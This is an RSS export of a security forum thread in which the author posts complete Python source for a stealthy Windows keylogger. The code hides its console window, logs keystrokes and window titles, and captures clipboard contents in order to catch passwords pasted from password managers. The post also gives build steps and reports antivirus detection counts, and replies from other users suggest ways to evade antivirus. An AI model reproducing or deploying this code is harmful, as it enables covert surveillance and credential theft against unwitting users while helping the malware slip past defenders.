<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Malware writing - Python malware, part 1</title>
    <link>https://0x00sec.org/t/malware-writing-python-malware-part-1/11700</link>
    <description># Malware writing series - Python Malware, part 1

I recently was sifting through a bunch of Humble Bundle, which like many, I had acquired in the past but never read and saw Black Hat Python. Curious to see what this was all about, I started looking some of the examples and identified issues that really annoyed me.

1. It&#39;s written for Python 2.7. Python 3 has been out for years. 
2. It uses multiple packages that are now deprecated or extremely buggy, such as pyHook. 
3. It lacks a lot of neat tricks that one could do simply with standard user privileges.

Having written my share of malwares for **fun** *cough* in the past, I thought it would be interesting to revisit some basic features using today&#39;s most *hip* and popular languages. I think it will also be a good tutorial for people starting in security in general to give a rough idea of the capabilities.

It&#39;s worth noting that popular red team techniques such as dumping credentials from LSASS are almost completely useless with modern EDR (Endpoint Detection and Response) solutions as this is what they are looking for.

Which is why going back to basics and have a little bit of patience is all you need and is the most efficient. Everything is done here with standard user privileges, in the user&#39;s context.

So why Python?
    - Easy to learn and good for good for people new to programming
    - Less commonly used and less chances to get flagged by AVs
    - Can be executed in multiple ways.
    - Can interface with C functions and the Windows API with ctypes or pywin32

But there are a few shortcomings:
    - Slow and low performance compared to pure C because the code interpreted during execution
    - Large executables (but it&#39;s 2019 so bandwith shouldn&#39;t be an issue)
    - Can&#39;t do real multi-threading due to GIL (we&#39;ll get into that later in the series)

The tutorial will be divided in multiple parts. In each part, we will build a different module that will provide a specific set of features to our malware,including a module to use Github as C2 (always better to hide in plain sight). Then we&#39;ll look at different ways to run, compile and distribute the malware. The code will be available in the https://github.com/tr4cefl0w/0x00sec repository. 

It&#39;s worth mentioning that I didn&#39;t add a lot of exception handling or did much testing due to lack of time, but it&#39;s good enough (and like Joel Salatin says, good enough is perfect) for an introduction. Also, I&#39;m not a Python expert and haven&#39;t touched the WinAPI a lot in the past decade so feel free to point out any mistake or improvements that could be done.

This part focuses on keylogging, the second part will likely be capturing or dumping credentials, although there&#39;s some of this in that first part with the clipboard.

That keylogger currently has 0 detections on VirusTotal but it doesn&#39;t do much other than logging. It&#39;s not sending the data or doing anything else. You can find the results here:
https://www.virustotal.com/#/file/352337f857d72a263d4263e3a1643e2435e25e6eb91ab765bbbd8306a45babdc/detection


## Building a keylogger
Calling functions is easy, but figuring out the algorithm is often the painful part.

First and foremost, we want to determine the actions that will need to be performed. What&#39;s the point of logging what&#39;s typed if you can&#39;t contextualize it?

We need to know:
    - What the current program is?
    - When and what keys are pressed?
    - How to deal with special keys and how we can use them?
    - When to capture the clipboard?

To do so, we need to find a way to access multiple Windows API functions. Code from Black Hat Python and similar books mostly pyWin32 and pyHook. But, pyHook is only (officialy) available for Python 2.7 and still has a lot of old bugs that have yet to be fixed. For the keylogger, I figured it&#39;d be better to use ctypes from the standard library as it would show some basics on how to use it to call Windows API functions. 

In future parts we&#39;ll likely just use PyWin32 for the simplicity and great documentation.

Let&#39;s start.

Create a folder for the project and a sub-folder called modules. In the modules folder, create the file `keylogger.py` then open it in your text editor.

We first import the required standard libraries. Then, we have to import the Windows DLLs that provide the functions we&#39;ll need. In this case, we&#39;ll need `kernel32.dll` and `user32.dll`. Finally, we want to avoid showing the console window on the desktop which would raise suspicions.

```
import ctypes       # For interfacing with C functions
import logging      # For logging the keystrokes on disk

kernel32 = ctypes.windll.kernel32   # Access functions from kernel32.dll
user32 = ctypes.windll.user32       # Access functions from user32.dll

user32.ShowWindow(kernel32.GetConsoleWindow(), 0)   # Hide console
```

### get_current_window() function
We have to build a function to get the current window title so we know in what program the user is typing. 

```
def get_current_window(): # Function to grab the current window and its title
    
    # Required WinAPI functions
    GetForegroundWindow = user32.GetForegroundWindow
    GetWindowTextLength = user32.GetWindowTextLengthW
    GetWindowText = user32.GetWindowTextW
    
    hwnd = GetForegroundWindow() # Get handle to foreground window
    length = GetWindowTextLength(hwnd) # Get length of the window text in title bar, passing the handle as argument
    buff = ctypes.create_unicode_buffer(length + 1) # Create buffer to store the window title string
    
    GetWindowText(hwnd, buff, length + 1) # Get window title and store in buff

    return buff.value # Return the value of buff
```

Now we can use this function to get the current window title and later use it in the keylogging function. 

### get_clipboard() function
The second function is to capture the content of the clipboard. It is a bit tricky to set up but it shows how to use pointers with ctypes.

```
def get_clipboard():
    
    CF_TEXT = 1 # Set clipboard format

    # Argument and return types for GlobalLock/GlobalUnlock.
    kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
    kernel32.GlobalLock.restype = ctypes.c_void_p
    kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]

    # Return type for GetClipboardData
    user32.GetClipboardData.restype = ctypes.c_void_p
    user32.OpenClipboard(0)
    
    # Required clipboard functions
    IsClipboardFormatAvailable = user32.IsClipboardFormatAvailable
    GetClipboardData = user32.GetClipboardData
    CloseClipboard = user32.CloseClipboard

    try:
        if IsClipboardFormatAvailable(CF_TEXT): # If CF_TEXT is available
            data = GetClipboardData(CF_TEXT) # Get handle to data in clipboard
            data_locked = kernel32.GlobalLock(data) # Get pointer to memory location where the data is located
            text = ctypes.c_char_p(data_locked) # Get a char * pointer (string in Python) to the location of data_locked
            value = text.value # Dump the content in value
            kernel32.GlobalUnlock(data_locked) # Decrement de lock count
            return value.decode(&#39;utf-8&#39;) # Return the clipboard content
    finally:
        CloseClipboard() # Close the clipboard
```

Now we have the function to capture the clipboard content. Of course this could be done in fewer lines of code with PyWin32 but I figured it would be good to do something using only the standard library and show some basic usage of ctypes.

### get_keystrokes() function
Now, the keylogging function. That function, when called, requires two argument. The directory where the log file will be stored and the file name. Then, we configure the logger that will write the log file on disk. Finally, we set up the WinAPI function and variables we need, such as a dictionary for the special keys pressed such as &lt;CTRL&gt;, &lt;SHIFT&gt;, &lt;ENTER&gt; and so on.

The keylogging algorithm is set to run indefinitely using a `while` loop. The reason is that we don&#39;t want the keylogging to stop unless it is told to do so. This means that if we want to do other tasks meanwhile, we need to run it in parallel with other functions either in a thread or separate process. This will be challenging and we&#39;ll cover this later in the series when attempting to do real parallelism (which is not the same as concurrency by the way). We&#39;ll also introduce some modifications to use a timer to stop/start the keylogger as an alternative to parallelism.

```
def get_keystrokes(log_dir, log_name): # Function to monitor and log keystrokes

    # Logger
    logging.basicConfig(filename=(log_dir +&quot;\\&quot; + log_name), level=logging.DEBUG, format=&#39;%(message)s&#39;)

    GetAsyncKeyState = user32.GetAsyncKeyState # WinAPI function that determines whether a key is up or down
    special_keys = {0x08: &#39;BS&#39;, 0x09: &#39;Tab&#39;, 0x10: &#39;Shift&#39;, 0x11: &#39;Ctrl&#39;, 0x12: &#39;Alt&#39;, 0x14: &#39;CapsLock&#39;, 0x1b: &#39;Esc&#39;, 0x20: &#39;Space&#39;, 0x2e: &#39;Del&#39;}
    current_window = None
    line = [] # Stores the characters pressed

    while True:

        if current_window != get_current_window(): # If the content of current_window isn&#39;t the currently opened window
            current_window = get_current_window() # Put the window title in current_window
            logging.info(str(current_window).encode(&#39;utf-8&#39;)) # Write the current window title in the log file
        
        for i in range(1, 256): # Because there are 256 ASCII characters (even though we only really use 128)
            if GetAsyncKeyState(i) &amp; 1: # If a key is pressed and matches an ASCII character
                if i in special_keys: # If special key, log as such
                    logging.info(&quot;&lt;{}&gt;&quot;.format(special_keys[i]))
                elif i == 0x0d: # If &lt;ENTER&gt;, log the line typed then clear the line variable
                    logging.info(line)
                    line.clear()
                elif i == 0x63 or i == 0x43 or i == 0x56 or i == 0x76: # If characters &#39;c&#39; or &#39;v&#39; are pressed, get clipboard data
                    clipboard_data = get_clipboard()
                    logging.info(&quot;[CLIPBOARD] {}&quot;.format(clipboard_data))
                elif 0x30 &lt;= i &lt;= 0x5a: # If alphanumeric character, append to line
                    line.append(chr(i))
```

That&#39;s it! A side note on capturing the clipboard data. We trigger the function when the user&#39;s presses &#39;c&#39; or &#39;v&#39; because we want to log when a password is copied for a password manager and in case the user right-clicks to paste instead of using the keyboard shortcut. However, this might repeatedly log the clipboard content in the log file. We could call EmptyClipboard() after but that could raise suspicions. If you think of a better way, feel free to share!

Now we assemble everything to make the keylogger module.

```
import ctypes
import logging

# Required librairies
kernel32 = ctypes.windll.kernel32
user32 = ctypes.windll.user32

# Hide console
user32.ShowWindow(kernel32.GetConsoleWindow(), 0)

def get_current_window(): # Function to grab the current window and its title

    GetForegroundWindow = user32.GetForegroundWindow
    GetWindowTextLength = user32.GetWindowTextLengthW
    GetWindowText = user32.GetWindowTextW

    hwnd = GetForegroundWindow() # Get handle to foreground window
    length = GetWindowTextLength(hwnd) # Get length of the window text in title bar
    buff = ctypes.create_unicode_buffer(length + 1) # Create buffer to store the window title string
    
    GetWindowText(hwnd, buff, length + 1) # Get window title and store in buff

    return buff.value # Return the value of buff

def get_clipboard():
    
    CF_TEXT = 1 # Set clipboard format

    # Argument and return types for GlobalLock/GlobalUnlock.
    kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
    kernel32.GlobalLock.restype = ctypes.c_void_p
    kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]

    # Return type for GetClipboardData
    user32.GetClipboardData.restype = ctypes.c_void_p
    user32.OpenClipboard(0)
    
    # Required clipboard functions
    IsClipboardFormatAvailable = user32.IsClipboardFormatAvailable
    GetClipboardData = user32.GetClipboardData
    CloseClipboard = user32.CloseClipboard

    try:
        if IsClipboardFormatAvailable(CF_TEXT): # If CF_TEXT is available
            data = GetClipboardData(CF_TEXT) # Get handle to data in clipboard
            data_locked = kernel32.GlobalLock(data) # Get pointer to memory location where the data is located
            text = ctypes.c_char_p(data_locked) # Get a char * pointer (string in Python) to the location of data_locked
            value = text.value # Dump the content in value
            kernel32.GlobalUnlock(data_locked) # Decrement de lock count
            return value.decode(&#39;utf-8&#39;) # Return the clipboard content
    finally:
        CloseClipboard() # Close the clipboard

def get_keystrokes(log_dir, log_name): # Function to monitor and log keystrokes

    # Logger
    logging.basicConfig(filename=(log_dir +&quot;\\&quot; + log_name), level=logging.DEBUG, format=&#39;%(message)s&#39;)

    GetAsyncKeyState = user32.GetAsyncKeyState # WinAPI function that determines whether a key is up or down
    special_keys = {0x08: &#39;BS&#39;, 0x09: &#39;Tab&#39;, 0x10: &#39;Shift&#39;, 0x11: &#39;Ctrl&#39;, 0x12: &#39;Alt&#39;, 0x14: &#39;CapsLock&#39;, 0x1b: &#39;Esc&#39;, 0x20: &#39;Space&#39;, 0x2e: &#39;Del&#39;}
    current_window = None
    line = [] # Stores the characters pressed

    while True:

        if current_window != get_current_window(): # If the content of current_window isn&#39;t the currently opened window
            current_window = get_current_window() # Put the window title in current_window
            logging.info(str(current_window).encode(&#39;utf-8&#39;)) # Write the current window title in the log file
        
        for i in range(1, 256): # Because there are 256 ASCII characters (even though we only really use 128)
            if GetAsyncKeyState(i) &amp; 1: # If a key is pressed and matches an ASCII character
                if i in special_keys: # If special key, log as such
                    logging.info(&quot;&lt;{}&gt;&quot;.format(special_keys[i]))
                elif i == 0x0d: # If &lt;ENTER&gt;, log the line typed then clear the line variable
                    logging.info(line)
                    line.clear()
                elif i == 0x63 or i == 0x43 or i == 0x56 or i == 0x76: # If characters &#39;c&#39; or &#39;C&#39; are pressed, get clipboard data
                    clipboard_data = get_clipboard()
                    logging.info(&quot;[CLIPBOARD] {}&quot;.format(clipboard_data))
                elif 0x30 &lt;= i &lt;= 0x5a: # If alphanumeric character, append to line
                    line.append(chr(i))
```

To run the keylogger, we need to create the main program file that will import the module and execute the keylogger. In the root of your project directory, create a `main.py` file and add the following:

```
import os
from modules import keylogger

log_dir = os.environ[&#39;localappdata&#39;]
log_name = &#39;applog.txt&#39;

keylogger.get_keystrokes(log_dir, log_name)
```

You can modify the `log_dir` and `log_name` to set the folder and file name of your choice. You can then run it as a Python script with `python main.py` or build a standalone executable with PyInstaller like the one uploaded on Virus Total. To do so, install PyInstaller with `pip install pyinstaller` then run `pyinstaller --onefile main.py -w`.

The executable will be located in the `dist` folder. If you run it through Window Explorer, you&#39;ll see that no console window appears. 

I created a dummy account in Bitwarden (my password manager) and attempted to log in Office 365 just to show the password being pasted with the clipboard when &#39;v&#39; is hit. Here&#39;s the content of the log file.

```
b&#39;Bitwarden&#39;
b&#39;Sign in to your Microsoft account - Firefox Developer Edition (Private Browsing)&#39;
&lt;Ctrl&gt;
[CLIPBOARD] p1zz4
```

Looking at the task manager, you can see it running:

![2019-02-19%2010_07_48-Task%20Manager|621x54](upload://n34VYZ5b3JkQHMGPqW7qa5setGm.png) 

Look at that CPU usage! As pointed out by @dtm in comments, this is mostly caused by the fact that we&#39;re using GetAsyncKeyState() instead of SetWindowsHookExA() and he is right. 

However, after testing a simple example of Python keylogger using SetWindowsHookExA(), it triggered 4 AVs detections:
https://www.virustotal.com/#/file/a3b0373348756b46ccb53772a33da8bc483b0978f984e46637c64c79975cd8ae/detection

To investigate! I&#39;ll attempt to find a way to use SetWindowsHookExA() without triggering any detection and update the code and the article if I succeed. If any of you can do it, please share in comment :slight_smile: 

Python references:
https://docs.python.org/3/library/ctypes.html
https://docs.python.org/3/library/logging.html
https://pyinstaller.readthedocs.io/en/stable/usage.html

MSDN references:
https://docs.microsoft.com/en-us/windows/desktop/api/winuser/
https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-globallock
https://docs.microsoft.com/en-us/windows/desktop/dataxchg/standard-clipboard-formats
https://docs.microsoft.com/en-us/windows/desktop/dataxchg/clipboard-functions

Edit 2019/02/19: Updated the article taking into account @dtm&#39;s comment.</description>
    
    <lastBuildDate>Sat, 02 Mar 2019 20:34:55 +0000</lastBuildDate>
    <category>Malware</category>
    <atom:link href="https://0x00sec.org/t/malware-writing-python-malware-part-1/11700.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Malware writing - Python malware, part 1</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-1/11700/22">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-1/11700/22</link>
        <pubDate>Thu, 21 Mar 2019 15:31:56 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-11700-22</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-1/11700.rss">Malware writing - Python malware, part 1</source>
      </item>
      <item>
        <title>Malware writing - Python malware, part 1</title>
        <dc:creator><![CDATA[tr4cefl0w]]></dc:creator>
        <description><![CDATA[
            <p>Size doesn’t really matter (insert “that’s what she said” joke here) nowadays. If your target doesn’t have broadband, better give up. Detection ratio has nothing to do with the use of Python.</p>
          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-1/11700/20">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-1/11700/20</link>
        <pubDate>Sat, 02 Mar 2019 20:01:48 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-11700-20</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-1/11700.rss">Malware writing - Python malware, part 1</source>
      </item>
      <item>
        <title>Malware writing - Python malware, part 1</title>
        <dc:creator><![CDATA[tr4cefl0w]]></dc:creator>
        <description><![CDATA[
            <p>Thank you so much, I appreciate it. Please read part two, it’s a better version of the keylogger but a bit more complicated to write.</p>
          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-1/11700/19">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-1/11700/19</link>
        <pubDate>Sat, 02 Mar 2019 19:59:50 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-11700-19</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-1/11700.rss">Malware writing - Python malware, part 1</source>
      </item>
      <item>
        <title>Malware writing - Python malware, part 1</title>
        <dc:creator><![CDATA[xXxH4CK0RxXx]]></dc:creator>
        <description><![CDATA[
            <p>nice tutorial, thanks a lot! <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"> this is one of the first great tutorials for python hacking I have seen.</p>
          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-1/11700/18">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-1/11700/18</link>
        <pubDate>Sat, 02 Mar 2019 19:08:35 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-11700-18</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-1/11700.rss">Malware writing - Python malware, part 1</source>
      </item>
      <item>
        <title>Malware writing - Python malware, part 1</title>
        <dc:creator><![CDATA[HACKER]]></dc:creator>
        <description><![CDATA[
            <p>Subject is very nice but I don’t like Python Malware because a lot of file size and detection rate is high. (Sorry my bad english, I hope you understand <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"> )</p>
<p>Thank you for this topic. <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-1/11700/17">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-1/11700/17</link>
        <pubDate>Sat, 23 Feb 2019 10:27:30 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-11700-17</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-1/11700.rss">Malware writing - Python malware, part 1</source>
      </item>
      <item>
        <title>Malware writing - Python malware, part 1</title>
        <dc:creator><![CDATA[tr4cefl0w]]></dc:creator>
        <description><![CDATA[
            <p>Yes and no. In this case these are heuristic detections which means the AV ran it in a sandbox to analyze the behavior. These kind of detection are to be expected by a keylogger depending on the WinAPI functions that are called and the AV itself.</p>
<p>PyInstaller by itself is rarely the cause that triggers AV detection. But yes, there are multiple ways to distribute and execute a Python malware and we’ll cover that later.</p>
          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-1/11700/16">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-1/11700/16</link>
        <pubDate>Fri, 22 Feb 2019 13:29:15 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-11700-16</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-1/11700.rss">Malware writing - Python malware, part 1</source>
      </item>
      <item>
        <title>Malware writing - Python malware, part 1</title>
        <dc:creator><![CDATA[hunter]]></dc:creator>
        <description><![CDATA[
            <p>You may actually decrease the detection rate by <strong>not</strong> compiling the Python code into an exe. I know it sounds counterintuitive but legit exe’s written in Python are rare, flat Python scripts are not <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"> You may have to obfuscate your suspicious events a little bit tho.</p>
          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-1/11700/15">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-1/11700/15</link>
        <pubDate>Fri, 22 Feb 2019 10:20:08 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-11700-15</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-1/11700.rss">Malware writing - Python malware, part 1</source>
      </item>
      <item>
        <title>Malware writing - Python malware, part 1</title>
        <dc:creator><![CDATA[metalerk]]></dc:creator>
        <description><![CDATA[
            <p>Actually that’s a good point that I overlooked.<br>
What do you suggest to retrieve the log remotely instead?</p>
          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-1/11700/14">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-1/11700/14</link>
        <pubDate>Wed, 20 Feb 2019 16:55:50 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-11700-14</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-1/11700.rss">Malware writing - Python malware, part 1</source>
      </item>
      <item>
        <title>Malware writing - Python malware, part 1</title>
        <dc:creator><![CDATA[tr4cefl0w]]></dc:creator>
        <description><![CDATA[
            <p>Regarding your question, that’s something I’m planning to test because I haven’t used py2exe, cx_freeze and others. I think some of the solutions out there don’t have good support for Python 3 too.</p>
<p>Generally when heuristics signatures are triggered, it’s because the AV determined that your program is doing shady things when ran in the AVs own virtual machine. Because I don’t know py2exe I can’t say for what reason it triggered detections.</p>
          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-1/11700/13">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-1/11700/13</link>
        <pubDate>Wed, 20 Feb 2019 13:14:38 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-11700-13</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-1/11700.rss">Malware writing - Python malware, part 1</source>
      </item>
      <item>
        <title>Malware writing - Python malware, part 1</title>
        <dc:creator><![CDATA[tr4cefl0w]]></dc:creator>
        <description><![CDATA[
            <p>Like I mentioned in the article, Github will be used to send files with the objective of hiding in plain site. I might do examples  with other services too. You also have to consider firewalls and what threat hunters are looking for. Infected hosts sending data by FTP are easy to catch.</p>
          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-1/11700/12">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-1/11700/12</link>
        <pubDate>Wed, 20 Feb 2019 10:44:37 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-11700-12</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-1/11700.rss">Malware writing - Python malware, part 1</source>
      </item>
      <item>
        <title>Malware writing - Python malware, part 1</title>
        <dc:creator><![CDATA[0x5a]]></dc:creator>
        <description><![CDATA[
            <p>Hey do you use any special arguments when compiling with pyinstaller? will using certain flags or different compiler (py2exe) trigger any av stuff or should it not matter… In the past I have compiled a python keylogger I wrote (compiled with py2exe) and it was fine until I compiled with --no-console flag or something of that nature and then the AV got a little upset. Not sure if you have any specific things in mind with that (I’m a noob concerning windows stuff) Thanks!</p>
          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-1/11700/11">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-1/11700/11</link>
        <pubDate>Wed, 20 Feb 2019 06:01:20 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-11700-11</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-1/11700.rss">Malware writing - Python malware, part 1</source>
      </item>
      <item>
        <title>Malware writing - Python malware, part 1</title>
        <dc:creator><![CDATA[metalerk]]></dc:creator>
        <description><![CDATA[
            <p>Maybe it could work with a version which has to connect remotely.<br>
Anyways, it depends on the use purpose.<br>
Good job!</p>
          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-1/11700/10">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-1/11700/10</link>
        <pubDate>Wed, 20 Feb 2019 05:33:43 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-11700-10</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-1/11700.rss">Malware writing - Python malware, part 1</source>
      </item>
      <item>
        <title>Malware writing - Python malware, part 1</title>
        <dc:creator><![CDATA[tr4cefl0w]]></dc:creator>
        <description><![CDATA[
            <p>As discussed in PM, let’s work on this together in a later section for more advanced techniques and improvements. This really is just supposed to be an intro <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p>I don’t want to scare newcomers away with a deep dive in the Windows API. I’d run away myself.</p>
          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-1/11700/9">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-1/11700/9</link>
        <pubDate>Wed, 20 Feb 2019 04:03:11 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-11700-9</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-1/11700.rss">Malware writing - Python malware, part 1</source>
      </item>
      <item>
        <title>Malware writing - Python malware, part 1</title>
        <dc:creator><![CDATA[dtm]]></dc:creator>
        <description><![CDATA[
            <p>Did you encode the string in <code>GetProcAddress</code>?</p>
          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-1/11700/8">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-1/11700/8</link>
        <pubDate>Wed, 20 Feb 2019 03:59:45 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-11700-8</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-1/11700.rss">Malware writing - Python malware, part 1</source>
      </item>
      <item>
        <title>Malware writing - Python malware, part 1</title>
        <dc:creator><![CDATA[tr4cefl0w]]></dc:creator>
        <description><![CDATA[
            <p>Just tried, same result:<br>
<a href="https://www.virustotal.com/#/file/d4da068026519db750743d3b839f5136560b708ceb3783020f5ab1a4cbc02ca4/detection" class="onebox" target="_blank" rel="nofollow noopener">https://www.virustotal.com/#/file/d4da068026519db750743d3b839f5136560b708ceb3783020f5ab1a4cbc02ca4/detection</a></p>
<p>I guess i’ll try Pynput and PyWin32 and make a second part where we attempt to use SetWindowsHookExA. I might need your help, I’ll ping you on IRC if I do.</p>
<p>Thanks for your insight!</p>
          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-1/11700/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-1/11700/7</link>
        <pubDate>Wed, 20 Feb 2019 03:58:28 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-11700-7</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-1/11700.rss">Malware writing - Python malware, part 1</source>
      </item>
      <item>
        <title>Malware writing - Python malware, part 1</title>
        <dc:creator><![CDATA[dtm]]></dc:creator>
        <description><![CDATA[
            <aside class="quote no-group" data-username="tr4cefl0w" data-post="1" data-topic="11700">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="20" height="20" src="https://0x00sec.org/letter_avatar_proxy/v4/letter/t/c2a13f/40.png" class="avatar"> tr4cefl0w:</div>
<blockquote>
<p>However, after testing a simple example of Python keylogger using SetWindowsHookExA(), it triggered 4 AVs detections:</p>
</blockquote>
</aside>
<p>Probably static heuristics, try using <code>GetProcAddress</code>/<code>LoadLibrary</code> combination.</p>
          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-1/11700/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-1/11700/6</link>
        <pubDate>Wed, 20 Feb 2019 03:49:54 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-11700-6</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-1/11700.rss">Malware writing - Python malware, part 1</source>
      </item>
      <item>
        <title>Malware writing - Python malware, part 1</title>
        <dc:creator><![CDATA[tr4cefl0w]]></dc:creator>
        <description><![CDATA[
            <p>That defeats the whole purpose of hiding in plain sight.</p>
          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-1/11700/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-1/11700/5</link>
        <pubDate>Wed, 20 Feb 2019 00:59:24 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-11700-5</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-1/11700.rss">Malware writing - Python malware, part 1</source>
      </item>
      <item>
        <title>Malware writing - Python malware, part 1</title>
        <dc:creator><![CDATA[tr4cefl0w]]></dc:creator>
        <description><![CDATA[
            <p>Hey <a class="mention" href="https://0x00sec.org/u/dtm">@dtm</a>! Thanks for the comment, very enlightening. You’re right about SetWindowsHookEx. I totally forgot about that and will definitely update the code and the article with the modifications when I find the time for it. You’re right, forgot about the copy/paste with the mouse too! I wish I had read your article before. I just finished reading it and I can see more clearly where the issues are now.</p>
          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-1/11700/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-1/11700/4</link>
        <pubDate>Wed, 20 Feb 2019 00:58:44 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-11700-4</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-1/11700.rss">Malware writing - Python malware, part 1</source>
      </item>
      <item>
        <title>Malware writing - Python malware, part 1</title>
        <dc:creator><![CDATA[dtm]]></dc:creator>
        <description><![CDATA[
            <aside class="quote no-group quote-modified" data-username="tr4cefl0w" data-post="1" data-topic="11700">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="20" height="20" src="https://0x00sec.org/letter_avatar_proxy/v4/letter/t/c2a13f/40.png" class="avatar"> tr4cefl0w:</div>
<blockquote>
<p>Look at that CPU usage! It’s caused by the code being interpreted and the infinite loop with <code>while True:</code> . We’ll likely (try to) fix that in the future with a timer or by converting to C with Cython.</p>
</blockquote>
</aside>
